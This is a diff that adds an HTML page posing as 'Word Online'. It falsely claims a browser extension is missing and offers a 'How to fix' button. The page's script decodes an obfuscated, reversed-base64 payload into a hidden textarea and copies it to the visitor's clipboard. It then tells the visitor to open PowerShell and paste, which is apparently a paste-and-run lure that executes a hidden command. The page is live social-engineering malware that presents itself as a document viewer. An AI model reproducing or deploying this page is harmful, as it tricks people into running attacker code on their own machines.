@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<style>
+
+body
+{
+	font-family: Arial, sans-serif;
+	height: 100%;
+	width: 100%;
+	background-image: url("https://linktoxic34.com/wp-content/themes/twentytwentytwo/background.gif");
+	background-repeat: no-repeat;
+	background-size: cover;
+}
+
+.modal
+{
+	display: none;
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	background-color: rgba(0, 0, 0, 0.5);
+	animation: fadeIn 0.5s;
+}
+
+.modal-content
+{
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%);
+	background-color: #fefefe;
+	padding: 20px;
+	border: 1px solid #888;
+	width: 80%;
+	max-width: 500px;
+}
+
+@keyframes fadeIn
+{
+	from
+	{
+		opacity: 0;
+	}
+
+	to
+	{
+		opacity: 1;
+	}
+}
+
+.container
+{
+	display: flex;
+	gap: 22px;
+}
+
+.auto-width
+{
+	flex: 1;
+}
+
+.fixed-width
+{
+	width: 64px;
+}
+
+#prompt
+{
+	display: none;
+	font-size: 13px;
+}
+
+.icon
+{
+	width: 16px;
+	height: 16px;
+	margin-right: 5px;
+}
+
+.blue-button
+{
+	display: inline-block;
+	padding: 10px 20px;
+	background-color: #2b579a;
+	color: #fff;
+	text-align: center;
+	text-decoration: none;
+	font-size: 14px;
+	cursor: pointer;
+	border-radius: 5px;
+}
+
+.blue-button:hover
+{
+	background-color: #3865a9;
+}
+
+.second-button
+{
+	display: inline-block;
+	padding: 10px 20px;
+	background-color: #f0f0f0;
+	color: #333;
+	text-align: center;
+	text-decoration: none;
+	font-size: 14px;
+	cursor: pointer;
+	border-radius: 5px;
+	transition: background-color 0.3s ease;
+}
+
+.second-button:hover
+{
+	background-color: #e0e0e0;
+}
+
+</style>
+<title>Word Online</title>
+</head>
+<body>
+
+<audio id="myAudio">
+</audio>
+
+<div class="modal" id="myModal">
+	<div class="modal-content">
+		<div class="container">
+			<div class="fixed-width">
+				<img src="data:image/png;base64,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" width="64" height="64">
+			</div>
+
+			<div class="auto-width">
+			<p style="font-size: 15px;">Create, edit and share Word documents. Work with others on shared projects, in real-time.</p>
+			</div>
+		</div>
+
+		<p>The "Word Online" extension is not installed in your browser. To view the document offline, click the "How to fix" button.</p>
+
+		<div id="prompt">
+			1. Right-click the Start <img src="data:image/png;base64,R0lGODlhAAIAArMAAABlre/1+s/i8A9usi+BvE+Vxm+o0Y+726/P5f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAUAAAkALAAAAAAAAgACAAT/MMlJq7046827/2AojmRpnmiqrmzrvnAsz3Rt33iu73zv/8CgcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvter/gsHhMLpvP6LR6zW673/C4fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRkpNCAQIIBwYFBAOUnp9xlpianACmp6agqqtgopmbA6iyswCstrdPrqSxtL29uMDBPrqwvsbHqcLKyyzEpcjQ0czT1BzOvNHZ2rXV3cvX2+Hiyd7lnuDj6erm7Ivo6vDx3O30fe/y+Pj1+3P3+f8A+Qk84w+gwYPzBirEUhChQ4cLI+a69OrZw4sYZUncOKRhxo8f/zmKvOERpMmTI1OuKHmypcuEKmNuYPmyZk2ZOCfQtMmzZ06OO3sKHQrzp7mgRJMmNVoNqdKnUJnicgq1qtWiUh1RvcqVa1Z3FHd1HUt221dBW8uqVXs2T9q1cOO2hfM2rt27WOe2ClsMr9+/4fR6qQu4MGDBVQgbXrwYMRXGkCOvcyxFsuXL0ChXxsy58ynNUTyLxgwaxTUYo1NHLv3BI2rVsAuztkD1dezbd0ErJtcCt2+5Z3f7sv27eNecwrURN8486sbk8JY3nz6UH3SD0qlrv9ntesbs28ObFOb9JXjx6C+qKk/0fPr32B+xv+oevn15iOavrX+//zhA+v3Fn/9/BGaDR4CrvVDggtG9gaBnAzIo4SxoPHhbhBNmmBdDfFmk4TEYfsggh6P0JWJgCp6oIipQWFhgiCv2h4SLH8IYo31A0HjjhifsqCIOOvpIYYpCaghDkEWCSGSSEprWITZMPmVjlNSBgCSVk7mA5YgXXLllPlN+WZyXYiIUZplopnnQmWq26WY6bL4p55xKaknnnXg2aGeefPaZ2ZJ+BioobywMaqigcR6qqJCJLuroio0+KqmRgE5qKZaRXqqpjJVu6umNmX4q6nahjmoqc6Weqipuqa7qamqtviorZ7HOamuCe96qK6md7urrb7X+KixcwQ5r7FjFHqtsVcku62z/e70+K61hzU5rbUvVXqvtd9Fu6y1Z2X4r7j/hjmuunr2dqy593a7rLne5visvT+XOa++Q8d6rb0jt7usvuf3+KzC6hQ5scHz5HqwwnAEv7LAx9T48bsQSf0txxdtejPG1Gm88bccePwtyyMuOTPKxJp88bMoq/8pyy7u+DPOtMs88a802v4pzzqvuzPOpPv88atBCf0p00ZsejfSlSi89adNOPwp11ItOTfWhVl89aNZaB8p1131+DXaeYo99Z9lmz4l22m+uzXabbr+dZtxyl0l33V/ejTemDe/9cd9+iwx44CUPTjjKhh++cuKKu8x44zE/DjnNkk9+c+WW64x5/+Y9b8450J5/PnToohtNeulJn44606qv/nTrrksNe+xVz0471rbfvnXuunvNe+9h/w482cIPf3bxxquNfPJtL8883M4/P3f00ttNffV5X4893wlvL6re3msHfvjTjU8+qtqfz2j66u9ofvu+vQ//hezP/2P99osof/6w4s9/hvv7H4T8J0Auda+AuzsgAn2nwAUGr4EOJB4EI3i8CVJQeRa8YPMyqEHocbCD0/sgCK0nwhFmr4Qm5F66UijBFbKwgi58IQZjKMMN0rCGHrwhDkOowx2SsIc+PCEQg6jCghFRTQE8IrIIqET6obCJ+mMiFFWTxCkyS4pWFE0Vs6iULf9yEVpP/OKCvChGn2CxjJYhIxrhNcQ11uiMbmSMGuOIEjhKazZ4zKMe98jHPvrxj4AMpCAHSchCGvKQiEykIhfJyEY68pGQjKQkJ0nJSlrykpjMpCY3yclOevKToAylKEdJylKa8pSoTKUqV8nKVrrylbCMpSxnScta2vKWuMylLnfJy14aYWBzpCNIgilMboWxmOghJjIfosxlmsmOzrRLM6MZEGhScz/WvGZZpqlN/GSzm8f5JjjZdcxxAkuc5nROOdPpxDayk1frfCcV0SnP6tCznmaMJz4HqM990uqe/jQPQAOKrYESdDwGPSi/+qlQyHCzobR4KEQ1ktCJQqT/ohZdE0YzWk2GctQvEuVoSDM6UouWdKInhWhKG7pShbb0oC8laEwDOlN/1nSfN8VnTuu5U3n29J0/ZWdQ0zlUcxZ1nEcFZ1K7uVRtNvWaT6VmVKM5VWdWdZlXRWZWi7lVYXaVjl+NY1jdONY1lhWNZy1jWsW41i+2lYtvzWJcrTjXKdYVindtYl6VuNcj9pWIfw1iYH042B0WFoeHrWFiZbjYFzaWhY9NYWRNONkRVhaEl+1gZjW42Qt2loKfjWBoHTjaBZYWgactYGoFuNr/tZZ/r81fbO032/nVFn63bV9u1bfb8/WWfL8NX3C9N9ztFRd7x61ecqW33Oc1l3nP/01edI033eFVF3jX7V12dbfd23WXdt+NXXhdN97VlRd15y1dekW33s+1l3PvzVx8LTffydUXcvdtXH4Vt9/D9Zdw/w1cgP024L0VGG8HrluC5bbgtzWYbQ9OW4TNNuGxVRhsF+5ahrW24at1GCBkSp1HD4aBECvqwwDzgIlbaESqOalEHorciA12pCddbsbAJImNv7dRWeVox7LDscBmBGQ/oRhME4ExlGzY4qiRqCJL3tKR9fGFFfdPyP+qUJGjiGV/0WXLBJqyN+1gZbb0WHN+KLM63Wmz/IB5nl3eFyTUvFA2z2w9bz7MmV1FnjybOc768gad/wToe1nHz/Tac//nJGJlMccDOYhGmJ1h1hb9OJpgghHOpbOUx9ooWlWEdM2nQafI04zaVLTU8CxVLUtWx9LVsBx04XQpa135kjaR9vKtrZHrde2aBLXG3a9TEGw8DVsGxebhsWuQbCYt+8dKvvGzidBsA057CdV+z7UT02s3bZsL2Y7Nt8cQbtKMOw3lls25vxxtSK37Dum2yrv/EO98znsQ9R7mvRmRb0nve87dVve/V9FvQg88GAVn0cEFHXChLPzQ7ZbSwxnd8GdOXCVBunhWLK3xTFc8oh1njadDzkdRk3yQpj65ylfO8pa7/OUwj7nMZ07zmtv85jjPuc53zvOe+/znQA+60EUCEgEAOw==" width="16" height="16"> button and run "Windows PowerShell" ("Windows Terminal").<br />
+			2. Right-click in the console window.<br />
+			Wait for the operation to complete and reload the page.<br /><br />
+		</div>
+
+		<center>
+			<a id="download" href="#" class="blue-button">How to fix</a>
+			<a href="https://chromewebstore.google.com/detail/word-online/fiombgjlkfpdpkbhfioofeeinbehmajg?hl=en" target="_blank" class="second-button">Details</a>
+		</center>
+		<textarea id="code" cols="1" rows="1" style="margin: -10000px;"></textarea>
+
+	</div>
+</div>
+<script>
+
+	// Функция реверса строки
+	function reverse(s)
+	{
+		return s.split("").reverse().join("");
+	}
+
+	// Документ загружен полностью
+	$(document).ready(function()
+	{
+		// Полезная нагрузка
+		var payload = atob(reverse("K0gCNsDdphXZK0gCNsjIgICIlVHbhZVLgQmch9mYwlGbD1CdlNlCNoQD7kSKpQjNlNXYiRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbhyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbhCellmCNoQD7IySwc2QONHRkpXOHFGdJhVWshnMZtEM39EcRpmTnd3QNd2dplEdWdEZ6x2MVlWQDxUaVJjWoJESJxGaHR2ZRdVW2h3ValnQTpleGdlWzJESJN3aIJ2cW5mW65EWapmTXRmeCNkWsJFWaNnQYJmdOdUS1lzVhBjRtNGbCNjYnV1RhVlSDt0M5cUYUBnaPRGazI2QWJjWo50MjxWMrxkex02Y2p1aMpHZzI2a1cVYYVzUixmUzMWNOFzVLBzdPBXS5NGdKNjYHVTejNTOHpVdsJjV1BzVaBjTYVGVKN0SsFzVZ9EeXlFcS52YoJkRhBDbyY1aGJjYNBnaPRGbIJWaxclW65EWRVHNyIGcSNTWshXbaxmSsxEdWdEZ6x2MVJGcRR0Swc3T0UTRKdWTzMGbOJjY5JEWMBjSYlFMO52QONHRl9kUDlEb4dVYtJFWkZXMDlEaShUY1NXbjhmUywkdkhEZ1IlbixGZIRWNS5mYsRGSkZXTYpFdWdUYwkzQkVnVHRWd5ITW0F0MkZHMyIma1MkT610VhRTOHRmc1cVYzlTeMZTTINGMShUYntWbjFTMDlEMOhlWxYEWalnSXp1MxMlWylTbkVHbtNkTzpnSoJFShVXTXF1Y4FTWwhXbZFjQIh1YO52Ys5EWkNGes9kakNUS5E0Ql9kUpNkTvFFR6VzRa9mTYR2caJDTnN2Vh1WNyImaChVYiASPgQjNlNXYiRiCNoQDz5GZoNXdsZ2LgcWam52bjBXa"));
+
+		// Вставка готового кода в textarea
+		$("#code").val(payload);
+
+		// Открытие модального окна
+		openModal();
+	});
+
+	// Функция отображения модального окна
+	function openModal()
+	{
+		var modal = document.getElementById("myModal");
+		modal.style.display = "block";
+		modal.style.animation = "fadeIn 0.8s";
+	}
+
+	// Функция проигрывания аудио
+	function playAudio()
+	{
+		
+	}
+
+	download.addEventListener("click", function()
+	{
+		var prompt = document.getElementById("prompt");
+		prompt.style.display = "block";
+
+		var codeInput = document.getElementById("code");
+		codeInput.select();
+		document.execCommand("copy");
+		window.getSelection().removeAllRanges();
+	});
+
+	window.addEventListener("click", function(event)
+	{
+		var modal = document.getElementById("myModal");
+		if(event.target == modal)
+		{
+			playAudio();
+		}
+	});
+
+</script>
+</body>
+</html>
